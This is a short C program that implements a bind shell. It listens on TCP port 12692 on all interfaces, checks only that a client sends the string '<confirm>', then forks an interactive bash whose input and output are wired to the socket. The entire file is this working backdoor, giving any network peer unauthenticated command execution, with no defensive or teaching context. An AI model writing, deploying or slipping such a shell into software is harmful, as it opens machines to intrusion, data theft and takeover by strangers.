#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>

#define PORT 12692
#define BUFFSIZE 512
#define CONFIRMATION "<confirm>\n"
#define ERROR "<error>\n"
#define OK "<ok>\n"

void handle_client(int);

int main(int argc, char *argv[])
{
  //
  //Socket Variable Instantiation
  //
  int server_sockfd, client_sockfd;
  int result;
  socklen_t server_len, client_len;
  struct sockaddr_in server_address;
  struct sockaddr_in client_address;

  //
  //Create Socket
  //
  if((server_sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
    perror("");
    exit(1);
  }

  //
  //Fill in sockaddr_in Struct
  //
  server_address.sin_family = AF_INET;
  server_address.sin_addr.s_addr = htonl(INADDR_ANY);
  server_address.sin_port = htons(PORT);
  server_len = sizeof(server_address);
  client_len = sizeof(client_address);

  //
  //Bind Socket with sockaddr Struct
  //
  result = bind(server_sockfd, (struct sockaddr *)&server_address, server_len);
  if(result == -1){
    perror("Bind refused");
    exit(1);
  }

  //
  //Set server socket to listen for connections
  //
  if((result = listen(server_sockfd, 5)) != 0){
    perror("");
    exit(1);
  }

  //
  //Set signal to ignore when a child process is killed
  //
  signal(SIGCHLD, SIG_IGN);

  //
  //never ending server loop, accepting new connections to this machine's ip
  //
  while(1) {
    client_sockfd = accept(server_sockfd, (struct sockaddr *)&client_address, &client_len);
    if(client_sockfd == -1){

      //
      //rejected client, print an error and close the socket
      //
      perror("Broken Socket");
      close(client_sockfd);

    }else

      //
      //accepted client
      //
      handle_client(client_sockfd);
  }
}

void handle_client(int connect_fd){

  //
  //IO buffer
  //
  char buff[BUFFSIZE];

  //
  //Confirm the socket connected is a client
  //
  write(connect_fd, &CONFIRMATION, strlen(CONFIRMATION));
  read(connect_fd, &buff, strlen(CONFIRMATION));

  if(0 != strncmp(buff, CONFIRMATION, strlen(CONFIRMATION))){
    write(connect_fd, &ERROR, strlen(ERROR));
    close(connect_fd);
    return;
  }

  //
  //Fully accept the client, give them a bash process to talk to
  //
  write(connect_fd, &OK, strlen(OK));

  //
  //child has to make bash process for client socket
  //
  if(fork() == 0){
    int i = 0;

    //
    //Redirect STDIN, STDOUT, and STDERR to the socket
    //
    while(i < 3) dup2(connect_fd, i++);

    //
    //Create New Session for bash
    //
    setsid();

    //
    //Exec Bash (There should be no 'return' from this point on)
    //
    execlp("bash", "bash", "--noediting", "-i", NULL);

    //
    //If we've reached this line, something went horribly wrong.
    //
    exit(EXIT_FAILURE);

  }else{

    //
    //parent has to accept more possible clients.
    //Close connect file descriptor and return to accept loop
    //
    close(connect_fd);
    return;
  }
}
